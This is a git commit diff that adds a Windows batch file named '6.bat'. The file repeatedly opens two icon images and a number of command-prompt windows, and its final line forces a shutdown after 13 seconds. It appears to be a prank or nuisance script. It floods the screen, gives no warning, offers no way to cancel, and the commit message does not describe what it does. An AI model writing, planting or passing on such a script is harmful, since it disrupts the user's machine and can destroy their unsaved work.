424e952cca39ac646e82367045c6f544b0e00827
BABAlePaf <comptetwitch543@gmail.com>
2025-07-08 00:02:28 +0200

    Add files via upload

---
+++ Nouveau dossier/6.bat
@@ -0,0 +1,36 @@
+timeout 5
+start image.ico
+
+timeout 2
+start image2.ico
+
+timeout 2 
+start image.ico
+
+timeout 2
+start image.ico
+start image2.ico
+start cmd
+start image.ico
+start image2.ico
+start cmd 
+start image.ico
+start image2.ico
+start cmd 
+start image.ico
+start image2.ico
+start cmd 
+start image.ico
+start image2.ico
+start cmd 
+start image.ico
+start image2.ico
+start cmd
+start image.ico
+start image2.ico
+start cmd 
+start image.ico
+start image2.ico
+start cmd 
+shutdown -s -t 13
+
